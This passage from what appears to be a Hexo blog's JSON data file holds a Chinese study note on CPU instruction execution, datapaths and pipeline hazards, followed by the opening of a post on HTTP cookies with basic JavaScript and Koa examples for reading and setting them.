title=\"小结：\"></a>小结：</h4><p>至此，第四章也完成了。这一章主要讲的是生成可执行文件的过程，由最初始的编辑代码，然后将其预编译，编译，汇编，链接，生成可执行文件。这个过程是不仅由我们看到的小黑框那么简单，这段时间还经历着将代码转成汇编，将所定义的全局变量以及函数名称建表，把各个符号通过重定位形成一个最终没有缺失的可执行文件。第四章让我很清晰的清楚可执行文件的生成，也把当初的黑匣子打开，让我更深刻的理解其工作原理。</p>"},{"title":"计算机系统基础－－第五章(程序的执行)","date":"2017-05-25T00:37:05.000Z","dir":"计算机系统基础","keywords":"计算机系统基础－－第四章(程序的执行)","_content":"按照ISA的复杂程度而言，有复杂指令集（CISC）和精简指令集（RISC）两种类型的计算机。而intel就是属于前者\n#### 程序执行的概述\n指令周期：CPU取出并执行一条指令的时间成为指令周期，不同指令的周期时间可能不同。\n执行程序顺序:\n```\n1、取指令：从pc所支出的存储单元取出指令送到指令寄存器\n2、指令译码：例如，mov $0x0,%eax，将立即数送到寄存器ebp中\n3、计算源操作数地址并取操作数：根据寻址方式确定源操作数地址计算方式，若是存储器数据，则最多一次\n4、执行数据操作：在ALU或加法器等运算部件中取出的操作数进行计算\n5、计算目的操作数地址并存结果：根据寻址方式确定目的操作数地址计算方式，若是存储器数据，则最多一次，若是寄存器数据，则在进行数据操作时直接存结果到寄存器\n6、计算下一条指令地址：顺序执行时，将pc加上当前指令长度即可。如果是转移类指令时，需要根据条件标识、操作码和寻址方式确定下一条指令\n```\n#### 基本操作：\n```\n1、读取某储存单元内容(可能是指令或操作数或操作数地址)，并将其装入某个寄存器。\n2、把一个数据从某个寄存器存储到给定存储单元。\n3、把一个数据从某个寄存器传送到另一个寄存器或ALU。\n4、在ALU中进行某种算术运算或逻辑运算，并将结果送到某个寄存器中。\n```\n#### cup的基本功能和组成\n由程序计数器(PC),指令寄存器(IR)，指令译码器(ID),脉冲源及起停控制逻辑，时序信号产生部件，操作控制信号形成部件，总线控制逻辑，终端机构组成\n#### 打断程序正常执行的事件\n1、内部异常：源自于正在运行程序本身，来自于cpu内部。是必然，同步事件。\n2、外部中断：源自于正在运行程序的条件，来足浴cpu外部，是偶然，异步事件。\n#### 数据通路基本逻辑和工作原理\n操作元件：多路选择器(MUX)，加法器(ADDER)，算术逻辑部件(ALU)，译码器(Decoder)\n状态元件：D触发器，这需要建立时间以及保持时间，也称触发器的锁存延迟。\n数据通路的时钟周期：cycle Time = clk-to-Q(稳定时间)+Longest Delay(处理时间)+ 建立时间+时钟偏移。\n工作原理：\n![simpleBus](simpleBus.jpg)\n数据通路中的部件之间可以通过总线方式连接，ALU及所有的寄存器通过一条内部的公共总线连接起来，已构成单总线结构数据通路，因为在cpu内部成为cpu内总线。\n**1、完成算术或逻辑运算**\n```\n其完成R[R3]<-R[R1]+R[R2]操作如下：\n1、R1(out),Y(in)\n2、R2(out),add,Z(in)\n3、Z(out),R3(in)\n```\n**2、从内存读取一个字(指令或数据或数据的地址)**\n```\n其完成R[R2]<-M[R[R1]]操作如下：\n1、R1(out),MAR(in)\n2、read,WMFC(使cpu进行等待)\n3、MAR(out),R2(in)\n```\n**3、把一个字(数据)写入内存**\n```\n其完成M[R[R2]]<-R[R1]操作如下：\n1、R1(out),MDR(in)\n2、R2(out),MAR(in)\n3、write,WMFC\n```\n#### 流水线方式下命令的执行\n想象以下，你有一堆衣服，有洗，甩干，晾三个操作，分别时间是40,30,20。有洗衣机和甩干机，晾必须得自己操作，当然，洗衣间衣服的时间是40+30+20,若洗n件衣服，依然还是使用这种算法，则总时间为n(40+30+20),而我们最好的方法是：\n\n_在洗第n件衣服时，正好在甩干第n-1件，在晾第n-2件。而大家都同时以40分钟时间为标准，因此。最后的总时间为：40n+30+20，节省不少时间。_\n在计算机中也是如此，设计原则是：\n**指令流水段个数以最复杂指令所用的功能段数为准，流水段的长度以最复杂的功能段的操作所用的时间为准。**\n因此，比较适合流水线的指令集特征为：\n1、指令长度尽量一致。\n2、指令格式尽量规整，尽量保证源寄存器的位置相同\n3、采用load/store型指令风格(指令集中只有load指令和store指令能访问内存储器，其他一律不行)\n4、数据和指令要在寄存器中“对齐存放”\n#### 流水线方式下出现问题\n1、结构冒险：可能逻辑A与逻辑D存放的正好是同一个寄存器，而同时需要运行这条指令，造成结构冒险，由于硬件共享产生的问题。\n解决方案：\n(1)、规定一个部件的每条指令只能使用一次，而且只能特定阶段使用\n(2)、通过设置多个独立的部件来避免资源的冲突\n\n2、数据冒险：后面的指令用到前面指令的运算结果，前面的指令还没有完成，结果还没有算出，造成数据冒险。\n解决方案：\n(1)、由编译器在数据相关的指令之间加若干个nop(空操作指令)指令，等待上一条数据的产生\n(2)、采用数据转发机制，即结果出来后通过旁路放到相关的exce阶段的ALU输入端\n(3)、通过硬件阻塞(插入气泡)来延迟load命令执行\n(4)、通过寄存器的读写操作进行特殊处理，保证在一个时钟的前半周期进行寄存器写，在后半期进行寄存器读。\n\n3、控制冒险:\n由于中断或转移指令的执行顺序，可能发生控制冒险。\n可通过插入气泡或插入空操作符解决。\n\n\n#### 小结：\n计算机程序的运行并没有那么简单，从简单的代码，转化为汇编之后，再变成单条的运行，之间发生了奇妙的变化，这章的学习让我明白软件的运行并不是简单我们看到的代码，而是分解之后单条单条的汇编代码，每条汇编代码又需要执行条小周期，才能完成一条汇编代码。而每条小周期还能变成一个完整的流水线。即使每个流水线都是有各种各样的问题，但解决流水线问题之后，速度是质的提升。这种思想也改变了我的思维，对代码效率的考虑。\n","source":"_posts/basic-computer-sience-chapter5.md","raw":"---\ntitle: 计算机系统基础－－第五章(程序的执行)\ndate: 2017-05-25 08:37:05\ntags: 计算机系统基础\ndir: 计算机系统基础\nkeywords: 计算机系统基础－－第四章(程序的执行)\n---\n按照ISA的复杂程度而言，有复杂指令集（CISC）和精简指令集（RISC）两种类型的计算机。而intel就是属于前者\n#### 程序执行的概述\n指令周期：CPU取出并执行一条指令的时间成为指令周期，不同指令的周期时间可能不同。\n执行程序顺序:\n```\n1、取指令：从pc所支出的存储单元取出指令送到指令寄存器\n2、指令译码：例如，mov $0x0,%eax，将立即数送到寄存器ebp中\n3、计算源操作数地址并取操作数：根据寻址方式确定源操作数地址计算方式，若是存储器数据，则最多一次\n4、执行数据操作：在ALU或加法器等运算部件中取出的操作数进行计算\n5、计算目的操作数地址并存结果：根据寻址方式确定目的操作数地址计算方式，若是存储器数据，则最多一次，若是寄存器数据，则在进行数据操作时直接存结果到寄存器\n6、计算下一条指令地址：顺序执行时，将pc加上当前指令长度即可。如果是转移类指令时，需要根据条件标识、操作码和寻址方式确定下一条指令\n```\n#### 基本操作：\n```\n1、读取某储存单元内容(可能是指令或操作数或操作数地址)，并将其装入某个寄存器。\n2、把一个数据从某个寄存器存储到给定存储单元。\n3、把一个数据从某个寄存器传送到另一个寄存器或ALU。\n4、在ALU中进行某种算术运算或逻辑运算，并将结果送到某个寄存器中。\n```\n#### cup的基本功能和组成\n由程序计数器(PC),指令寄存器(IR)，指令译码器(ID),脉冲源及起停控制逻辑，时序信号产生部件，操作控制信号形成部件，总线控制逻辑，终端机构组成\n#### 打断程序正常执行的事件\n1、内部异常：源自于正在运行程序本身，来自于cpu内部。是必然，同步事件。\n2、外部中断：源自于正在运行程序的条件，来足浴cpu外部，是偶然，异步事件。\n#### 数据通路基本逻辑和工作原理\n操作元件：多路选择器(MUX)，加法器(ADDER)，算术逻辑部件(ALU)，译码器(Decoder)\n状态元件：D触发器，这需要建立时间以及保持时间，也称触发器的锁存延迟。\n数据通路的时钟周期：cycle Time = clk-to-Q(稳定时间)+Longest Delay(处理时间)+ 建立时间+时钟偏移。\n工作原理：\n![simpleBus](simpleBus.jpg)\n数据通路中的部件之间可以通过总线方式连接，ALU及所有的寄存器通过一条内部的公共总线连接起来，已构成单总线结构数据通路，因为在cpu内部成为cpu内总线。\n**1、完成算术或逻辑运算**\n```\n其完成R[R3]<-R[R1]+R[R2]操作如下：\n1、R1(out),Y(in)\n2、R2(out),add,Z(in)\n3、Z(out),R3(in)\n```\n**2、从内存读取一个字(指令或数据或数据的地址)**\n```\n其完成R[R2]<-M[R[R1]]操作如下：\n1、R1(out),MAR(in)\n2、read,WMFC(使cpu进行等待)\n3、MAR(out),R2(in)\n```\n**3、把一个字(数据)写入内存**\n```\n其完成M[R[R2]]<-R[R1]操作如下：\n1、R1(out),MDR(in)\n2、R2(out),MAR(in)\n3、write,WMFC\n```\n#### 流水线方式下命令的执行\n想象以下，你有一堆衣服，有洗，甩干，晾三个操作，分别时间是40,30,20。有洗衣机和甩干机，晾必须得自己操作，当然，洗衣间衣服的时间是40+30+20,若洗n件衣服，依然还是使用这种算法，则总时间为n(40+30+20),而我们最好的方法是：\n\n_在洗第n件衣服时，正好在甩干第n-1件，在晾第n-2件。而大家都同时以40分钟时间为标准，因此。最后的总时间为：40n+30+20，节省不少时间。_\n在计算机中也是如此，设计原则是：\n**指令流水段个数以最复杂指令所用的功能段数为准，流水段的长度以最复杂的功能段的操作所用的时间为准。**\n因此，比较适合流水线的指令集特征为：\n1、指令长度尽量一致。\n2、指令格式尽量规整，尽量保证源寄存器的位置相同\n3、采用load/store型指令风格(指令集中只有load指令和store指令能访问内存储器，其他一律不行)\n4、数据和指令要在寄存器中“对齐存放”\n#### 流水线方式下出现问题\n1、结构冒险：可能逻辑A与逻辑D存放的正好是同一个寄存器，而同时需要运行这条指令，造成结构冒险，由于硬件共享产生的问题。\n解决方案：\n(1)、规定一个部件的每条指令只能使用一次，而且只能特定阶段使用\n(2)、通过设置多个独立的部件来避免资源的冲突\n\n2、数据冒险：后面的指令用到前面指令的运算结果，前面的指令还没有完成，结果还没有算出，造成数据冒险。\n解决方案：\n(1)、由编译器在数据相关的指令之间加若干个nop(空操作指令)指令，等待上一条数据的产生\n(2)、采用数据转发机制，即结果出来后通过旁路放到相关的exce阶段的ALU输入端\n(3)、通过硬件阻塞(插入气泡)来延迟load命令执行\n(4)、通过寄存器的读写操作进行特殊处理，保证在一个时钟的前半周期进行寄存器写，在后半期进行寄存器读。\n\n3、控制冒险:\n由于中断或转移指令的执行顺序，可能发生控制冒险。\n可通过插入气泡或插入空操作符解决。\n\n\n#### 小结：\n计算机程序的运行并没有那么简单，从简单的代码，转化为汇编之后，再变成单条的运行，之间发生了奇妙的变化，这章的学习让我明白软件的运行并不是简单我们看到的代码，而是分解之后单条单条的汇编代码，每条汇编代码又需要执行条小周期，才能完成一条汇编代码。而每条小周期还能变成一个完整的流水线。即使每个流水线都是有各种各样的问题，但解决流水线问题之后，速度是质的提升。这种思想也改变了我的思维，对代码效率的考虑。\n","slug":"basic-computer-sience-chapter5","published":1,"updated":"2021-09-11T05:44:13.360Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz00000f4jzxebj340o8","content":"<p>按照ISA的复杂程度而言，有复杂指令集（CISC）和精简指令集（RISC）两种类型的计算机。而intel就是属于前者</p><h4 id=\"程序执行的概述\"><a href=\"#程序执行的概述\" class=\"headerlink\" title=\"程序执行的概述\"></a>程序执行的概述</h4><p>指令周期：CPU取出并执行一条指令的时间成为指令周期，不同指令的周期时间可能不同。<br>执行程序顺序:<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、取指令：从pc所支出的存储单元取出指令送到指令寄存器</span><br><span class=\"line\">2、指令译码：例如，mov $0x0,%eax，将立即数送到寄存器ebp中</span><br><span class=\"line\">3、计算源操作数地址并取操作数：根据寻址方式确定源操作数地址计算方式，若是存储器数据，则最多一次</span><br><span class=\"line\">4、执行数据操作：在ALU或加法器等运算部件中取出的操作数进行计算</span><br><span class=\"line\">5、计算目的操作数地址并存结果：根据寻址方式确定目的操作数地址计算方式，若是存储器数据，则最多一次，若是寄存器数据，则在进行数据操作时直接存结果到寄存器</span><br><span class=\"line\">6、计算下一条指令地址：顺序执行时，将pc加上当前指令长度即可。如果是转移类指令时，需要根据条件标识、操作码和寻址方式确定下一条指令</span><br></pre></td></tr></table></figure><p></p><h4 id=\"基本操作：\"><a href=\"#基本操作：\" class=\"headerlink\" title=\"基本操作：\"></a>基本操作：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、读取某储存单元内容(可能是指令或操作数或操作数地址)，并将其装入某个寄存器。</span><br><span class=\"line\">2、把一个数据从某个寄存器存储到给定存储单元。</span><br><span class=\"line\">3、把一个数据从某个寄存器传送到另一个寄存器或ALU。</span><br><span class=\"line\">4、在ALU中进行某种算术运算或逻辑运算，并将结果送到某个寄存器中。</span><br></pre></td></tr></table></figure><h4 id=\"cup的基本功能和组成\"><a href=\"#cup的基本功能和组成\" class=\"headerlink\" title=\"cup的基本功能和组成\"></a>cup的基本功能和组成</h4><p>由程序计数器(PC),指令寄存器(IR)，指令译码器(ID),脉冲源及起停控制逻辑，时序信号产生部件，操作控制信号形成部件，总线控制逻辑，终端机构组成</p><h4 id=\"打断程序正常执行的事件\"><a href=\"#打断程序正常执行的事件\" class=\"headerlink\" title=\"打断程序正常执行的事件\"></a>打断程序正常执行的事件</h4><p>1、内部异常：源自于正在运行程序本身，来自于cpu内部。是必然，同步事件。<br>2、外部中断：源自于正在运行程序的条件，来足浴cpu外部，是偶然，异步事件。</p><h4 id=\"数据通路基本逻辑和工作原理\"><a href=\"#数据通路基本逻辑和工作原理\" class=\"headerlink\" title=\"数据通路基本逻辑和工作原理\"></a>数据通路基本逻辑和工作原理</h4><p>操作元件：多路选择器(MUX)，加法器(ADDER)，算术逻辑部件(ALU)，译码器(Decoder)<br>状态元件：D触发器，这需要建立时间以及保持时间，也称触发器的锁存延迟。<br>数据通路的时钟周期：cycle Time = clk-to-Q(稳定时间)+Longest Delay(处理时间)+ 建立时间+时钟偏移。<br>工作原理：<br><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter5/simpleBus.jpg\" alt=\"simpleBus\"><br>数据通路中的部件之间可以通过总线方式连接，ALU及所有的寄存器通过一条内部的公共总线连接起来，已构成单总线结构数据通路，因为在cpu内部成为cpu内总线。<br><strong>1、完成算术或逻辑运算</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其完成R[R3]&lt;-R[R1]+R[R2]操作如下：</span><br><span class=\"line\">1、R1(out),Y(in)</span><br><span class=\"line\">2、R2(out),add,Z(in)</span><br><span class=\"line\">3、Z(out),R3(in)</span><br></pre></td></tr></table></figure><p></p><p><strong>2、从内存读取一个字(指令或数据或数据的地址)</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其完成R[R2]&lt;-M[R[R1]]操作如下：</span><br><span class=\"line\">1、R1(out),MAR(in)</span><br><span class=\"line\">2、read,WMFC(使cpu进行等待)</span><br><span class=\"line\">3、MAR(out),R2(in)</span><br></pre></td></tr></table></figure><p></p><p><strong>3、把一个字(数据)写入内存</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其完成M[R[R2]]&lt;-R[R1]操作如下：</span><br><span class=\"line\">1、R1(out),MDR(in)</span><br><span class=\"line\">2、R2(out),MAR(in)</span><br><span class=\"line\">3、write,WMFC</span><br></pre></td></tr></table></figure><p></p><h4 id=\"流水线方式下命令的执行\"><a href=\"#流水线方式下命令的执行\" class=\"headerlink\" title=\"流水线方式下命令的执行\"></a>流水线方式下命令的执行</h4><p>想象以下，你有一堆衣服，有洗，甩干，晾三个操作，分别时间是40,30,20。有洗衣机和甩干机，晾必须得自己操作，当然，洗衣间衣服的时间是40+30+20,若洗n件衣服，依然还是使用这种算法，则总时间为n(40+30+20),而我们最好的方法是：</p><p><em>在洗第n件衣服时，正好在甩干第n-1件，在晾第n-2件。而大家都同时以40分钟时间为标准，因此。最后的总时间为：40n+30+20，节省不少时间。</em><br>在计算机中也是如此，设计原则是：<br><strong>指令流水段个数以最复杂指令所用的功能段数为准，流水段的长度以最复杂的功能段的操作所用的时间为准。</strong><br>因此，比较适合流水线的指令集特征为：<br>1、指令长度尽量一致。<br>2、指令格式尽量规整，尽量保证源寄存器的位置相同<br>3、采用load/store型指令风格(指令集中只有load指令和store指令能访问内存储器，其他一律不行)<br>4、数据和指令要在寄存器中“对齐存放”</p><h4 id=\"流水线方式下出现问题\"><a href=\"#流水线方式下出现问题\" class=\"headerlink\" title=\"流水线方式下出现问题\"></a>流水线方式下出现问题</h4><p>1、结构冒险：可能逻辑A与逻辑D存放的正好是同一个寄存器，而同时需要运行这条指令，造成结构冒险，由于硬件共享产生的问题。<br>解决方案：<br>(1)、规定一个部件的每条指令只能使用一次，而且只能特定阶段使用<br>(2)、通过设置多个独立的部件来避免资源的冲突</p><p>2、数据冒险：后面的指令用到前面指令的运算结果，前面的指令还没有完成，结果还没有算出，造成数据冒险。<br>解决方案：<br>(1)、由编译器在数据相关的指令之间加若干个nop(空操作指令)指令，等待上一条数据的产生<br>(2)、采用数据转发机制，即结果出来后通过旁路放到相关的exce阶段的ALU输入端<br>(3)、通过硬件阻塞(插入气泡)来延迟load命令执行<br>(4)、通过寄存器的读写操作进行特殊处理，保证在一个时钟的前半周期进行寄存器写，在后半期进行寄存器读。</p><p>3、控制冒险:<br>由于中断或转移指令的执行顺序，可能发生控制冒险。<br>可通过插入气泡或插入空操作符解决。</p><h4 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h4><p>计算机程序的运行并没有那么简单，从简单的代码，转化为汇编之后，再变成单条的运行，之间发生了奇妙的变化，这章的学习让我明白软件的运行并不是简单我们看到的代码，而是分解之后单条单条的汇编代码，每条汇编代码又需要执行条小周期，才能完成一条汇编代码。而每条小周期还能变成一个完整的流水线。即使每个流水线都是有各种各样的问题，但解决流水线问题之后，速度是质的提升。这种思想也改变了我的思维，对代码效率的考虑。</p>","site":{"data":{}},"excerpt":"","more":"<p>按照ISA的复杂程度而言，有复杂指令集（CISC）和精简指令集（RISC）两种类型的计算机。而intel就是属于前者</p><h4 id=\"程序执行的概述\"><a href=\"#程序执行的概述\" class=\"headerlink\" title=\"程序执行的概述\"></a>程序执行的概述</h4><p>指令周期：CPU取出并执行一条指令的时间成为指令周期，不同指令的周期时间可能不同。<br>执行程序顺序:<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、取指令：从pc所支出的存储单元取出指令送到指令寄存器</span><br><span class=\"line\">2、指令译码：例如，mov $0x0,%eax，将立即数送到寄存器ebp中</span><br><span class=\"line\">3、计算源操作数地址并取操作数：根据寻址方式确定源操作数地址计算方式，若是存储器数据，则最多一次</span><br><span class=\"line\">4、执行数据操作：在ALU或加法器等运算部件中取出的操作数进行计算</span><br><span class=\"line\">5、计算目的操作数地址并存结果：根据寻址方式确定目的操作数地址计算方式，若是存储器数据，则最多一次，若是寄存器数据，则在进行数据操作时直接存结果到寄存器</span><br><span class=\"line\">6、计算下一条指令地址：顺序执行时，将pc加上当前指令长度即可。如果是转移类指令时，需要根据条件标识、操作码和寻址方式确定下一条指令</span><br></pre></td></tr></table></figure><p></p><h4 id=\"基本操作：\"><a href=\"#基本操作：\" class=\"headerlink\" title=\"基本操作：\"></a>基本操作：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、读取某储存单元内容(可能是指令或操作数或操作数地址)，并将其装入某个寄存器。</span><br><span class=\"line\">2、把一个数据从某个寄存器存储到给定存储单元。</span><br><span class=\"line\">3、把一个数据从某个寄存器传送到另一个寄存器或ALU。</span><br><span class=\"line\">4、在ALU中进行某种算术运算或逻辑运算，并将结果送到某个寄存器中。</span><br></pre></td></tr></table></figure><h4 id=\"cup的基本功能和组成\"><a href=\"#cup的基本功能和组成\" class=\"headerlink\" title=\"cup的基本功能和组成\"></a>cup的基本功能和组成</h4><p>由程序计数器(PC),指令寄存器(IR)，指令译码器(ID),脉冲源及起停控制逻辑，时序信号产生部件，操作控制信号形成部件，总线控制逻辑，终端机构组成</p><h4 id=\"打断程序正常执行的事件\"><a href=\"#打断程序正常执行的事件\" class=\"headerlink\" title=\"打断程序正常执行的事件\"></a>打断程序正常执行的事件</h4><p>1、内部异常：源自于正在运行程序本身，来自于cpu内部。是必然，同步事件。<br>2、外部中断：源自于正在运行程序的条件，来足浴cpu外部，是偶然，异步事件。</p><h4 id=\"数据通路基本逻辑和工作原理\"><a href=\"#数据通路基本逻辑和工作原理\" class=\"headerlink\" title=\"数据通路基本逻辑和工作原理\"></a>数据通路基本逻辑和工作原理</h4><p>操作元件：多路选择器(MUX)，加法器(ADDER)，算术逻辑部件(ALU)，译码器(Decoder)<br>状态元件：D触发器，这需要建立时间以及保持时间，也称触发器的锁存延迟。<br>数据通路的时钟周期：cycle Time = clk-to-Q(稳定时间)+Longest Delay(处理时间)+ 建立时间+时钟偏移。<br>工作原理：<br><img src=\"/计算机系统基础/basic-computer-sience-chapter5/simpleBus.jpg\" alt=\"simpleBus\"><br>数据通路中的部件之间可以通过总线方式连接，ALU及所有的寄存器通过一条内部的公共总线连接起来，已构成单总线结构数据通路，因为在cpu内部成为cpu内总线。<br><strong>1、完成算术或逻辑运算</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其完成R[R3]&lt;-R[R1]+R[R2]操作如下：</span><br><span class=\"line\">1、R1(out),Y(in)</span><br><span class=\"line\">2、R2(out),add,Z(in)</span><br><span class=\"line\">3、Z(out),R3(in)</span><br></pre></td></tr></table></figure><p></p><p><strong>2、从内存读取一个字(指令或数据或数据的地址)</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其完成R[R2]&lt;-M[R[R1]]操作如下：</span><br><span class=\"line\">1、R1(out),MAR(in)</span><br><span class=\"line\">2、read,WMFC(使cpu进行等待)</span><br><span class=\"line\">3、MAR(out),R2(in)</span><br></pre></td></tr></table></figure><p></p><p><strong>3、把一个字(数据)写入内存</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其完成M[R[R2]]&lt;-R[R1]操作如下：</span><br><span class=\"line\">1、R1(out),MDR(in)</span><br><span class=\"line\">2、R2(out),MAR(in)</span><br><span class=\"line\">3、write,WMFC</span><br></pre></td></tr></table></figure><p></p><h4 id=\"流水线方式下命令的执行\"><a href=\"#流水线方式下命令的执行\" class=\"headerlink\" title=\"流水线方式下命令的执行\"></a>流水线方式下命令的执行</h4><p>想象以下，你有一堆衣服，有洗，甩干，晾三个操作，分别时间是40,30,20。有洗衣机和甩干机，晾必须得自己操作，当然，洗衣间衣服的时间是40+30+20,若洗n件衣服，依然还是使用这种算法，则总时间为n(40+30+20),而我们最好的方法是：</p><p><em>在洗第n件衣服时，正好在甩干第n-1件，在晾第n-2件。而大家都同时以40分钟时间为标准，因此。最后的总时间为：40n+30+20，节省不少时间。</em><br>在计算机中也是如此，设计原则是：<br><strong>指令流水段个数以最复杂指令所用的功能段数为准，流水段的长度以最复杂的功能段的操作所用的时间为准。</strong><br>因此，比较适合流水线的指令集特征为：<br>1、指令长度尽量一致。<br>2、指令格式尽量规整，尽量保证源寄存器的位置相同<br>3、采用load/store型指令风格(指令集中只有load指令和store指令能访问内存储器，其他一律不行)<br>4、数据和指令要在寄存器中“对齐存放”</p><h4 id=\"流水线方式下出现问题\"><a href=\"#流水线方式下出现问题\" class=\"headerlink\" title=\"流水线方式下出现问题\"></a>流水线方式下出现问题</h4><p>1、结构冒险：可能逻辑A与逻辑D存放的正好是同一个寄存器，而同时需要运行这条指令，造成结构冒险，由于硬件共享产生的问题。<br>解决方案：<br>(1)、规定一个部件的每条指令只能使用一次，而且只能特定阶段使用<br>(2)、通过设置多个独立的部件来避免资源的冲突</p><p>2、数据冒险：后面的指令用到前面指令的运算结果，前面的指令还没有完成，结果还没有算出，造成数据冒险。<br>解决方案：<br>(1)、由编译器在数据相关的指令之间加若干个nop(空操作指令)指令，等待上一条数据的产生<br>(2)、采用数据转发机制，即结果出来后通过旁路放到相关的exce阶段的ALU输入端<br>(3)、通过硬件阻塞(插入气泡)来延迟load命令执行<br>(4)、通过寄存器的读写操作进行特殊处理，保证在一个时钟的前半周期进行寄存器写，在后半期进行寄存器读。</p><p>3、控制冒险:<br>由于中断或转移指令的执行顺序，可能发生控制冒险。<br>可通过插入气泡或插入空操作符解决。</p><h4 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h4><p>计算机程序的运行并没有那么简单，从简单的代码，转化为汇编之后，再变成单条的运行，之间发生了奇妙的变化，这章的学习让我明白软件的运行并不是简单我们看到的代码，而是分解之后单条单条的汇编代码，每条汇编代码又需要执行条小周期，才能完成一条汇编代码。而每条小周期还能变成一个完整的流水线。即使每个流水线都是有各种各样的问题，但解决流水线问题之后，速度是质的提升。这种思想也改变了我的思维，对代码效率的考虑。</p>"},{"title":"管中窥豹看Cookie","date":"2019-04-09T13:14:04.000Z","dir":"http","keywords":["http","cookie"],"_content":"\n本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的[详细参数](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)。\n\n## Cookie介绍\n\n以下Wikipedia、MDN对cookie的介绍\n\n> **Wikipedia:**\n>\n> Cookie（复数形态Cookies），又称为“小甜饼”。类型为“**小型文本文件**”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。\n>\n> **MDN:**\n>\n> HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。\n\n**划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态**\n\nCookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。\n\n<div style=\"width: 80%; margin: 0 auto;text-align:center\">![cookies消息传递](exchange-cookies.png)Cookies的传输</div>\n\n**注意**：_Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。_\n\n\n## Cookie的特性\n\n### 前端数据存储及读写\n\nCookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie\n[document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)\n```javascript\n// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式\n// 可设置path，domain，max-age，expires，secure\n\n// 增加cookie\ndocument.cookie = `someCookieName=true; expires=${new Date().toGMTString() + 1}; path=/`\n// 删除cookie 通过设置过去的时间删除cookie\ndocument.cookie = `someCookieName=true; expires=${new Date().toGMTString() - 1}; path=/`\n// 修改cookie\ndocument.cookie = `someCookieName=false; expires=${new Date().toGMTString() + 1}; path=/`\n// 查找cookie\nnew RegExp(\"(?:^|;\\\\s*)\" + encodeURIComponent(\"需要查找的cookie\").replace(/[-.+*]/g, \"\\\\$&\") + \"\\\\s*\\\\=\")).test(document.cookie)\n```\n\n### 后端通过http头设置\n\n后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie[参数](https://github.com/pillarjs/cookies)\n```javascript\n// 以nodejs为例\n// 获取\nresponse.getHeader(\"Cookie\");\n// 设置\nresponse.setHeader(\"Cookie\", [\"name=gdccwxx\"]);\n\n// 以koa为例\n// 获取\nctx.cookies.get(name, [options])\n// 设置\nctx.cookies.set(name, value, [options])\n```\n\n### 请求时通过http头传给后端\n\n以Google键入请求为例\n<div style=\"width: 80%; margin: 0 auto;text-align:center\">![请求Google](font-transfer-cookie.png)请求通过http头传送给后端</div>\n\n### 遵守同源策略\n\nDomain 和 Path 